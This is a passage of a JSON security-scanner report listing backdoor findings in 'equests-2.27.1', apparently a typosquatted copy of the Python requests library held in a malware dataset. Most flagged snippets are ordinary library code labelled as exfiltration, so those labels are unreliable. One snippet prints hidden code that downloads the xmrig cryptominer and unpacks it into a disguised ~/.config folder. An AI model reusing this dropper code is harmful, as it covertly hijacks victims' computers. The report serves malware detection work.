                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 878,
                  "startColumn": 41,
                  "endLine": 878,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=INVALID_PATH)\n        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n",
                    "rendered": {
                      "text": "        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=INVALID_PATH)\n        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n",
                      "markdown": "`        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=INVALID_PATH)\n        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 872,
                  "startColumn": 41,
                  "endLine": 872,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), verify=INVALID_PATH)\n        assert str(e.value) == 'Could not find a suitable TLS CA certificate bundle, invalid path: {}'.format(INVALID_PATH)\n\n    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n",
                    "rendered": {
                      "text": "        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), verify=INVALID_PATH)\n        assert str(e.value) == 'Could not find a suitable TLS CA certificate bundle, invalid path: {}'.format(INVALID_PATH)\n\n    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n",
                      "markdown": "`        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), verify=INVALID_PATH)\n        assert str(e.value) == 'Could not find a suitable TLS CA certificate bundle, invalid path: {}'.format(INVALID_PATH)\n\n    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 30,
                  "endLine": 43,
                  "endColumn": 39,
                  "snippet": {
                    "text": "# listening on that port)\nTARPIT = 'http://10.255.255.1'\n\n# This is to avoid waiting the timeout of using TARPIT\nINVALID_PROXY='http://localhost:1'\n\ntry:\n",
                    "rendered": {
                      "text": "# listening on that port)\nTARPIT = 'http://10.255.255.1'\n\n# This is to avoid waiting the timeout of using TARPIT\nINVALID_PROXY='http://localhost:1'\n\ntry:\n",
                      "markdown": "`# listening on that port)\nTARPIT = 'http://10.255.255.1'\n\n# This is to avoid waiting the timeout of using TARPIT\nINVALID_PROXY='http://localhost:1'\n\ntry:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 59,
                  "endLine": 39,
                  "endColumn": 68,
                  "snippet": {
                    "text": "from .utils import override_environ\nfrom urllib3.util import Timeout as Urllib3Timeout\n\n# Requests to this URL should always fail with a connection timeout (nothing\n# listening on that port)\nTARPIT = 'http://10.255.255.1'\n\n",
                    "rendered": {
                      "text": "from .utils import override_environ\nfrom urllib3.util import Timeout as Urllib3Timeout\n\n# Requests to this URL should always fail with a connection timeout (nothing\n# listening on that port)\nTARPIT = 'http://10.255.255.1'\n\n",
                      "markdown": "`from .utils import override_environ\nfrom urllib3.util import Timeout as Urllib3Timeout\n\n# Requests to this URL should always fail with a connection timeout (nothing\n# listening on that port)\nTARPIT = 'http://10.255.255.1'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 24,
                  "endLine": 37,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\nfrom .compat import StringIO, u\nfrom .utils import override_environ\nfrom urllib3.util import Timeout as Urllib3Timeout\n\n# Requests to this URL should always fail with a connection timeout (nothing\n# listening on that port)\n",
                    "rendered": {
                      "text": "\nfrom .compat import StringIO, u\nfrom .utils import override_environ\nfrom urllib3.util import Timeout as Urllib3Timeout\n\n# Requests to this URL should always fail with a connection timeout (nothing\n# listening on that port)\n",
                      "markdown": "`\nfrom .compat import StringIO, u\nfrom .utils import override_environ\nfrom urllib3.util import Timeout as Urllib3Timeout\n\n# Requests to this URL should always fail with a connection timeout (nothing\n# listening on that port)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 86,
                  "endLine": 208,
                  "endColumn": 91,
                  "snippet": {
                    "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                    "rendered": {
                      "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                      "markdown": "`        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 59,
                  "endLine": 208,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                    "rendered": {
                      "text": "        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n",
                      "markdown": "`        \"\"\"\n        # support client code that unsets cookies by assignment of a None value:\n        if value is None:\n            remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n            return\n\n        if isinstance(value, Morsel):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 30,
                  "endLine": 143,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get('Cookie')\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n",
                    "rendered": {
                      "text": "    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get('Cookie')\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n",
                      "markdown": "`    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get('Cookie')\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 58,
                  "endLine": 72,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                    "rendered": {
                      "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                      "markdown": "`        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 30,
                  "endLine": 72,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                    "rendered": {
                      "text": "        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n",
                      "markdown": "`        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 30,
                  "endLine": 54,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get('Host'):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n",
                    "rendered": {
                      "text": "    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get('Host'):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n",
                      "markdown": "`    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get('Host'):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 45,
                  "endLine": 176,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    interface.\n\n    This is the CookieJar we create by default for requests and sessions that\n    don't specify one, since some clients may expect response.cookies and\n    session.cookies to support dict operations.\n\n    Requests does not use the dict interface internally; it's just for\n",
                    "rendered": {
                      "text": "    interface.\n\n    This is the CookieJar we create by default for requests and sessions that\n    don't specify one, since some clients may expect response.cookies and\n    session.cookies to support dict operations.\n\n    Requests does not use the dict interface internally; it's just for\n",
                      "markdown": "`    interface.\n\n    This is the CookieJar we create by default for requests and sessions that\n    don't specify one, since some clients may expect response.cookies and\n    session.cookies to support dict operations.\n\n    Requests does not use the dict interface internally; it's just for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 78,
                  "endLine": 75,
                  "endColumn": 84,
                  "snippet": {
                    "text": "        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\"Cookie headers should be added with add_unredirected_header()\")\n\n    def add_unredirected_header(self, name, value):\n",
                    "rendered": {
                      "text": "        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\"Cookie headers should be added with add_unredirected_header()\")\n\n    def add_unredirected_header(self, name, value):\n",
                      "markdown": "`        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\"Cookie headers should be added with add_unredirected_header()\")\n\n    def add_unredirected_header(self, name, value):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 35,
                  "endLine": 59,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse([\n            parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n            parsed.fragment\n",
                    "rendered": {
                      "text": "        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse([\n            parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n            parsed.fragment\n",
                      "markdown": "`        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse([\n            parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n            parsed.fragment\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/cookies.py"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 6,
                  "endLine": 14,
                  "snippet": {
                    "text": "\"\"\"\n\nimport copy\nimport time\nimport calendar\n\nfrom ._internal_utils import to_native_string\nfrom .compat import cookielib, urlparse, urlunparse, Morsel, MutableMapping\n",
                    "rendered": {
                      "text": "\"\"\"\n\nimport copy\nimport time\nimport calendar\n\nfrom ._internal_utils import to_native_string\nfrom .compat import cookielib, urlparse, urlunparse, Morsel, MutableMapping\n",
                      "markdown": "`\"\"\"\n\nimport copy\nimport time\nimport calendar\n\nfrom ._internal_utils import to_native_string\nfrom .compat import cookielib, urlparse, urlunparse, Morsel, MutableMapping\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/__init__.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 19,
                  "endLine": 25,
                  "endColumn": 25,
                  "snippet": {
                    "text": "... or POST:\n\n   >>> payload = dict(key1='value1', key2='value2')\n   >>> r = requests.post('https://httpbin.org/post', data=payload)\n   >>> print(r.text)\n   {\n     ...\n",
                    "rendered": {
                      "text": "... or POST:\n\n   >>> payload = dict(key1='value1', key2='value2')\n   >>> r = requests.post('https://httpbin.org/post', data=payload)\n   >>> print(r.text)\n   {\n     ...\n",
                      "markdown": "`... or POST:\n\n   >>> payload = dict(key1='value1', key2='value2')\n   >>> r = requests.post('https://httpbin.org/post', data=payload)\n   >>> print(r.text)\n   {\n     ...\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/__init__.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 19,
                  "endLine": 16,
                  "endColumn": 24,
                  "snippet": {
                    "text": "Basic GET usage:\n\n   >>> import requests\n   >>> r = requests.get('https://www.python.org')\n   >>> r.status_code\n   200\n   >>> b'Python is a programming language' in r.content\n",
                    "rendered": {
                      "text": "Basic GET usage:\n\n   >>> import requests\n   >>> r = requests.get('https://www.python.org')\n   >>> r.status_code\n   200\n   >>> b'Python is a programming language' in r.content\n",
                      "markdown": "`Basic GET usage:\n\n   >>> import requests\n   >>> r = requests.get('https://www.python.org')\n   >>> r.status_code\n   200\n   >>> b'Python is a programming language' in r.content\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/__init__.py"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 2,
                  "endLine": 37,
                  "endColumn": 6,
                  "snippet": {
                    "text": "   }\n\nThe other HTTP methods are supported - see `requests.api`. Full documentation\nis at <https://requests.readthedocs.io>.\n\n:copyright: (c) 2017 by Kenneth Reitz.\n:license: Apache 2.0, see LICENSE for more details.\n",
                    "rendered": {
                      "text": "   }\n\nThe other HTTP methods are supported - see `requests.api`. Full documentation\nis at <https://requests.readthedocs.io>.\n\n:copyright: (c) 2017 by Kenneth Reitz.\n:license: Apache 2.0, see LICENSE for more details.\n",
                      "markdown": "`   }\n\nThe other HTTP methods are supported - see `requests.api`. Full documentation\nis at <https://requests.readthedocs.io>.\n\n:copyright: (c) 2017 by Kenneth Reitz.\n:license: Apache 2.0, see LICENSE for more details.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/__init__.py"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 3,
                  "endLine": 164,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n",
                    "rendered": {
                      "text": "    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n",
                      "markdown": "`    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_testserver.py"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 28,
                  "endLine": 93,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n            # the (n+1)th request fails\n            with pytest.raises(requests.exceptions.ConnectionError):\n                r = requests.get(server_url)\n\n    @pytest.mark.skip(reason=\"this fails non-deterministically under pytest-xdist\")\n    def test_request_recovery(self):\n",
                    "rendered": {
                      "text": "\n            # the (n+1)th request fails\n            with pytest.raises(requests.exceptions.ConnectionError):\n                r = requests.get(server_url)\n\n    @pytest.mark.skip(reason=\"this fails non-deterministically under pytest-xdist\")\n    def test_request_recovery(self):\n",
                      "markdown": "`\n            # the (n+1)th request fails\n            with pytest.raises(requests.exceptions.ConnectionError):\n                r = requests.get(server_url)\n\n    @pytest.mark.skip(reason=\"this fails non-deterministically under pytest-xdist\")\n    def test_request_recovery(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_testserver.py"
                },
                "region": {
                  "startLine": 88,
                  "startColumn": 28,
                  "endLine": 88,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        with server as (host, port):\n            server_url = 'http://{}:{}'.format(host, port)\n            for _ in range(requests_to_handle):\n                r = requests.get(server_url)\n                assert r.status_code == 200\n\n            # the (n+1)th request fails\n",
                    "rendered": {
                      "text": "        with server as (host, port):\n            server_url = 'http://{}:{}'.format(host, port)\n            for _ in range(requests_to_handle):\n                r = requests.get(server_url)\n                assert r.status_code == 200\n\n            # the (n+1)th request fails\n",
                      "markdown": "`        with server as (host, port):\n            server_url = 'http://{}:{}'.format(host, port)\n            for _ in range(requests_to_handle):\n                r = requests.get(server_url)\n                assert r.status_code == 200\n\n            # the (n+1)th request fails\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_testserver.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 24,
                  "endLine": 62,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    def test_basic_response(self):\n        \"\"\"the basic response server returns an empty http response\"\"\"\n        with Server.basic_response_server() as (host, port):\n            r = requests.get('http://{}:{}'.format(host, port))\n            assert r.status_code == 200\n            assert r.text == u''\n            assert r.headers['Content-Length'] == '0'\n",
                    "rendered": {
